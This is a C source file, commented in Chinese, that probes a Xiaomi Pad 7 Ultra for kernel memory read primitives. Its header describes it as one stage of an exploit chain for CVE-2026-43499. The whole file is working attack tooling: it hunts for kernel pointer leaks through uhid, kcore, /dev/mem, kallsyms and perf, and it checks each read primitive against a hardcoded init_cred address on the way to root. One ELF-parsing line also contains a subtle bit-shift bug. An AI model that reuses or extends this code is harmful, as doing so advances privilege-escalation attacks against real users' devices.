/*
 * read_probe.c — 枚举 jinghu (Xiaomi Pad 7 Ultra) 上可用的内核读原语
 *
 * 目的: 在真机上跑一次, 看哪些接口能给到内核内存读 / 内核指针泄露。
 * 这是 CVE-2026-43499 利用链当前唯一的真实卡点 (mm_struct -> task_struct
 * 需要一次内核读, 而 ashmem SELinux 墙 + configfs_read_once bug 都堵死了旧路径)。
 *
 * 编译 (NDK):
 *   aarch64-linux-android21-clang -O2 -static read_probe.c -o read_probe
 * 运行 (设备, 任意 uid):
 *   ./read_probe
 *
 * 逐项报告: open 是否成功 / errno / 读到的内容 (是否有内核地址范围的值)。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <linux/uhid.h>
#include <linux/perf_event.h>
#include <sys/syscall.h>

#define KERNEL_PTR_LO 0xffff800000000000ULL
#define KERNEL_PTR_HI 0xffffffffffffffffULL

static int looks_kernel(uint64_t v) {
  return v >= KERNEL_PTR_LO && v <= KERNEL_PTR_HI;
}

static void try_open(const char *path, int flags) {
  int fd = open(path, flags);
  if (fd < 0) {
    printf("  [OPEN] %-28s FAIL errno=%d (%s)\n", path, errno, strerror(errno));
  } else {
    printf("  [OPEN] %-28s OK fd=%d\n", path, fd);
    close(fd);
  }
}

/* /dev/uhid: UHID_CREATE 后看内核是否在 event 里泄露指针 */
static void probe_uhid_leak(void) {
  printf("\n[uhid] open + UHID_CREATE\n");
  int fd = open("/dev/uhid", O_RDWR);
  if (fd < 0) {
    printf("  open FAIL errno=%d (%s)\n", errno, strerror(errno));
    return;
  }
  printf("  open OK fd=%d\n", fd);

  struct uhid_event ev;
  memset(&ev, 0, sizeof(ev));
  ev.type = UHID_CREATE;
  strcpy((char *)ev.u.create.name, "ghostlock_probe");
  ev.u.create.rd_size = 0;
  ev.u.create.bus = BUS_USB;
  ev.u.create.vendor = 0x1234;
  ev.u.create.product = 0x5678;

  ssize_t w = write(fd, &ev, sizeof(ev));
  printf("  UHID_CREATE write ret=%zd errno=%d\n", w, errno);

  if (w > 0) {
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(fd, &fds);
    tv.tv_sec = 1; tv.tv_usec = 0;
    if (select(fd + 1, &fds, NULL, NULL, &tv) > 0) {
      struct uhid_event rev;
      ssize_t r = read(fd, &rev, sizeof(rev));
      printf("  read ret=%zd type=%d\n", r, r > 0 ? rev.type : -1);
      uint64_t *p = (uint64_t *)&rev;
      for (int i = 0; i < (int)(sizeof(rev) / 8); i++) {
        if (looks_kernel(p[i]))
          printf("    LEAK? ev[%d]=%016llx (kernel ptr!)\n", i,
                 (unsigned long long)p[i]);
      }
    } else {
      printf("  no event returned\n");
    }
  }
  close(fd);
}

/* /proc/kcore: 内核全内存裸视图 (若 shell 可 open + read) */
static off_t kcore_vaddr_to_off(int fd, uint64_t vaddr) {
  uint8_t ehdr[64];
  if (pread(fd, ehdr, sizeof(ehdr), 0) != (ssize_t)sizeof(ehdr)) return -1;
  if (ehdr[0] != 0x7f || ehdr[1] != 'E' || ehdr[2] != 'L' || ehdr[3] != 'F')
    return -1;
  if (ehdr[4] != 2) return -1;  /* ELFCLASS64 */
  uint16_t e_phnum = (uint16_t)(ehdr[56] | (ehdr[57] << 8));
  uint64_t e_phoff = 0;
  for (int i = 0; i < 8; i++) e_phoff |= (uint64_t)ehdr[32 + i] << (8 * i);
  uint16_t e_phentsize = (uint16_t)(ehdr[54] | (ehdr[55] << 8));
  if (e_phentsize < 56) return -1;
  for (uint16_t i = 0; i < e_phnum; i++) {
    uint8_t ph[56];
    off_t phoff = (off_t)(e_phoff + (uint64_t)i * e_phentsize);
    if (pread(fd, ph, sizeof(ph), phoff) != (ssize_t)sizeof(ph)) return -1;
    uint32_t p_type = (uint32_t)(ph[0] | (ph[1] << 8) | (ph[2] << 8) | (ph[3] << 24));
    if (p_type != 1) continue;  /* PT_LOAD */
    uint64_t p_vaddr = 0, p_offset = 0, p_filesz = 0;
    for (int j = 0; j < 8; j++) {
      p_vaddr  |= (uint64_t)ph[16 + j] << (8 * j);
      p_offset |= (uint64_t)ph[8 + j]  << (8 * j);
      p_filesz |= (uint64_t)ph[32 + j] << (8 * j);
    }
    if (vaddr >= p_vaddr && vaddr < p_vaddr + p_filesz)
      return (off_t)(p_offset + (vaddr - p_vaddr));
  }
  return -1;
}

#define INIT_CRED_ADDR 0xffffff80020f0548ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL

/* 验证读原语: 读 init_cred 的前 0x40 字节, 检查 uid/gid = 0 (root).
 * 返回 1 表示读出来的 cred 内容合理 (读原语可信). */
static int validate_cred_read(const char *tag,
                              int (*read8)(void *ctx, uint64_t va, uint64_t *out),
                              void *ctx) {
  uint64_t cred[8] = {0};
  for (int i = 0; i < 8; i++) {
    uint64_t v = 0;
    if (!read8(ctx, INIT_CRED_ADDR + (uint64_t)i * 8, &v)) {
      printf("  [%s] read init_cred+0x%x FAIL\n", tag, i * 8);
      return 0;
    }
    cred[i] = v;
  }
  /* struct cred: usage@0, uid@4, gid@8, suid@12, sgid@16, euid@20, egid@24,
   *              fsuid@28, fsgid@32 — 对 init_cred 这些全为 0 (root). */
  int uid_ok = (cred[0] >> 32) == 0;  /* uid@4 在 cred[0] 高 32 位 */
  int gid_ok = (cred[1] & 0xffffffffULL) == 0;  /* gid@8 在 cred[1] 低 32 位 */
  printf("  [%s] init_cred: usage=%016llx uid=%u gid=%u\n", tag,
         (unsigned long long)cred[0],
         (unsigned)(cred[0] >> 32), (unsigned)(cred[1] & 0xffffffffULL));
  if (uid_ok && gid_ok) {
    printf("  [%s] VALIDATE OK: uid/gid==0 => 内核读原语可用!\n", tag);
    return 1;
  }
  printf("  [%s] VALIDATE WARN: uid/gid 非 0 (可能仍可读, 但需人工核对)\n", tag);
  return 0;
}

static int kcore_read8(void *ctx, uint64_t va, uint64_t *out) {
  int fd = *(int *)ctx;
  off_t off = kcore_vaddr_to_off(fd, va);
  if (off < 0) return 0;
  return pread(fd, out, 8, off) == 8;
}

static void probe_kcore(void) {
  printf("\n[kcore] /proc/kcore (init_cred=%016llx)\n",
         (unsigned long long)INIT_CRED_ADDR);
  int fd = open("/proc/kcore", O_RDONLY);
  if (fd < 0) {
    printf("  open FAIL errno=%d (%s)\n", errno, strerror(errno));
    return;
  }
  printf("  open OK fd=%d\n", fd);
  validate_cred_read("kcore", kcore_read8, &fd);
  close(fd);
}

/* /dev/mem: STRICT_DEVMEM 未设 -> 物理内存裸读写 (若 shell 可 open) */
static int devmem_read8(void *ctx, uint64_t va, uint64_t *out) {
  int fd = *(int *)ctx;
  uint64_t pa = va - DIRECT_MAP_BASE;  /* 线性映射 vaddr -> 物理地址 */
  return pread(fd, out, 8, (off_t)pa) == 8;
}

static void probe_devmem(void) {
  printf("\n[devmem] /dev/mem (CONFIG_STRICT_DEVMEM is not set)\n");
  printf("  phys = vaddr - %016llx\n", (unsigned long long)DIRECT_MAP_BASE);
  int fd = open("/dev/mem", O_RDWR);
  if (fd < 0) {
    printf("  open FAIL errno=%d (%s)\n", errno, strerror(errno));
    return;
  }
  printf("  open OK fd=%d  -> 物理内存裸读写可用!\n", fd);
  validate_cred_read("devmem", devmem_read8, &fd);
  close(fd);
}

/* /proc/kallsyms: kptr_restrict 决定是否泄露符号地址 */
static void probe_kallsyms(void) {
  printf("\n[kallsyms] /proc/kallsyms + kptr_restrict\n");
  int kf = open("/proc/sys/kernel/kptr_restrict", O_RDONLY);
  if (kf >= 0) {
    char v[8] = {0};
    read(kf, v, sizeof(v) - 1);
    printf("  kptr_restrict = %s", v);
    close(kf);
  }
  int fd = open("/proc/kallsyms", O_RDONLY);
  if (fd < 0) {
    printf("  /proc/kallsyms open FAIL errno=%d\n", errno);
    return;
  }
  char line[256] = {0};
  ssize_t n = read(fd, line, sizeof(line) - 1);
  if (n > 0) {
    line[n] = 0;
    /* 第一行通常是 '0000000000000000 T function' (受限) 或真实地址 */
    printf("  first line: %s", line);
    if (strncmp(line, "0000000000000000", 16) == 0)
      printf("  -> kallsyms 被 kptr_restrict 屏蔽 (无符号泄露)\n");
    else
      printf("  -> kallsyms 可读! 符号泄露可用\n");
  }
  close(fd);
}

/* perf_event: perf_event_paranoid 检查 + 能否 open */
static void probe_perf(void) {
  printf("\n[perf] perf_event_open (needs paranoid check)\n");
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_HARDWARE;
  attr.size = sizeof(attr);
  attr.config = PERF_COUNT_HW_INSTRUCTIONS;
  attr.disabled = 1;
  long ret = syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
  if (ret < 0) {
    printf("  perf_event_open FAIL errno=%d (%s)\n", errno, strerror(errno));
  } else {
    printf("  perf_event_open OK fd=%ld  -> perf 可用 (侧信道/泄露候选)\n", ret);
    close((int)ret);
  }
}

/* /proc/self/pagemap: 读自身虚拟页的 PFN (物理帧号, 非内核虚地址) */
static void probe_pagemap(void) {
  printf("\n[pagemap] /proc/self/pagemap\n");
  int fd = open("/proc/self/pagemap", O_RDONLY);
  if (fd < 0) {
    printf("  open FAIL errno=%d (%s)\n", errno, strerror(errno));
    return;
  }
  printf("  open OK fd=%d (注: 给的是物理帧号, 不是内核虚地址)\n", fd);
  close(fd);
}

int main(void) {
  printf("=== CVE-2026-43499 jinghu read-probe ===\n");
  printf("uid=%d euid=%d\n", getuid(), geteuid());

  printf("\n--- open() 可用性扫描 ---\n");
  try_open("/dev/ashmem", O_RDWR);
  try_open("/dev/uhid", O_RDWR);
  try_open("/proc/kcore", O_RDONLY);
  try_open("/dev/mem", O_RDWR);
  try_open("/proc/kallsyms", O_RDONLY);
  try_open("/proc/self/pagemap", O_RDONLY);

  probe_uhid_leak();
  probe_kcore();
  probe_devmem();
  probe_kallsyms();
  probe_perf();
  probe_pagemap();

  printf("\n=== probe done ===\n");
  printf("下一步: 把上面 FAIL/OK 结果回报, 优先验证 /dev/mem 与 /proc/kcore\n");
  return 0;
}
